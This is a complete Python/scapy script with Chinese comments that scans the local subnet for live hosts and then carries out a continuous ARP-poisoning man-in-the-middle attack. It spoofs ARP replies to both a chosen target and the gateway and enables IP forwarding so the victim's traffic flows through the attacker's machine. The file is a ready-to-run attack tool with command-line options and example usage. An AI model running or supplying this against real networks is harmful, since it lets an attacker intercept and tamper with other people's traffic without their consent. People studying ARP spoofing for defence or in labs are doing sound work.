#!/usr/bin/python3
# -*- coding: utf-8 -*-

from scapy.all import *
import re
import time
import sys
import os
import optparse

# 存放本机的MAC地址
local_mac = ""
# 存放本机的IP地址
local_ip = ""
# 存放存活主机的IP和MAC的字典
live_hosts = {}

# 获取存活主机的IP和MAC地址函数
def get_all_macs():
    # IP扫描列表，扫描当前网段
    scan_list = local_ip + '/24'
    try:
        # 通过对每个IP都进行ARP广播，获得存活主机的MAC地址
        # Ether(dst='FF:FF:FF:FF:FF:FF') 表示广播帧
        # ARP(pdst=scanList) 表示对扫描列表中的IP发送ARP请求
        ans, unans = srp(Ether(dst='FF:FF:FF:FF:FF:FF')/ARP(pdst=scan_list), timeout=2)
    except Exception as e:
        print(f"ARP扫描出错: {e}")
    else:
        # ans包含存活主机返回的响应包和响应内容
        for send, rcv in ans:
            # 对响应内容的IP地址和MAC地址进行格式化输出，存入addr_list
            addr_list = rcv.sprintf('%Ether.src%|%ARP.psrc%')
            # 把IP当作KEY，MAC当作VALUE 存入live_hosts字典
            ip, mac = addr_list.split('|')
            live_hosts[ip] = mac

# 根据IP地址获取主机的MAC地址
def get_one_mac(target_ip):
    # 若该IP地址存在，则返回MAC地址，否则返回0
    return live_hosts.get(target_ip, 0)

# ARP毒化函数，分别写入目标主机IP地址，网关IP地址，网卡接口名
def poison(target_ip, gateway_ip, ifname):
    # 获取毒化主机的MAC地址
    target_mac = get_one_mac(target_ip)
    # 获取网关的MAC地址
    gateway_mac = get_one_mac(gateway_ip)
    if target_mac and gateway_mac:
        try:
            # 用while持续毒化
            while True:
                # 对目标主机进行毒化，告诉目标主机网关的MAC地址是本机的MAC地址
                sendp(Ether(src=local_mac, dst=target_mac)/ARP(hwsrc=local_mac, hwdst=target_mac, psrc=gateway_ip, pdst=target_ip, op=2), iface=ifname, verbose=False)
                # 对网关进行毒化，告诉网关目标主机的MAC地址是本机的MAC地址
                sendp(Ether(src=local_mac, dst=gateway_mac)/ARP(hwsrc=local_mac, hwdst=gateway_mac, psrc=target_ip, pdst=gateway_ip, op=2), iface=ifname, verbose=False)
                time.sleep(1)
        except KeyboardInterrupt:
            print("===停止ARP毒化===")
    else:
        print("目标主机/网关主机IP有误，请检查!")
        sys.exit(0)

if __name__ == '__main__':
    parser = optparse.OptionParser('usage:python %prog -r targetIP -g gatewayIP -i iface \n\n'
                                   'Example: python %prog -r 192.168.1.130 -g 192.168.61.254 -i eth0')
    # 添加目标主机参数 -r
    parser.add_option('-r', '--rhost', dest='rhost', default='192.168.1.1', type='string', help='target host')
    # 添加网关参数 -g
    parser.add_option('-g', '--gateway', dest='gateway', default='192.168.1.254', type='string', help='target gateway')
    # 添加网卡参数 -i
    parser.add_option('-i', '--iface', dest='iface', default='eth0', type='string', help='interfaces name')
    (options, args) = parser.parse_args()
    # 获取本机的MAC地址
    local_mac = get_if_hwaddr(options.iface)
    # 获取本机的IP地址
    local_ip = get_if_addr(options.iface)
    print("===开始收集存活主机的IP和MAC===")
    get_all_macs()
    print("===收集完成===")
    print(f"===收集数量:{len(live_hosts)}===")
    print("===开启路由转发功能===")
    # 开启IP转发功能
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("sysctl net.ipv4.ip_forward")
    print("===开始进行ARP毒化===")
    try:
        poison(options.rhost, options.gateway, options.iface)
    except KeyboardInterrupt:
        print("===停止ARP毒化===")
        print("===停止路由转发功能===")
        # 关闭IP转发功能
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        os.system("sysctl net.ipv4.ip_forward")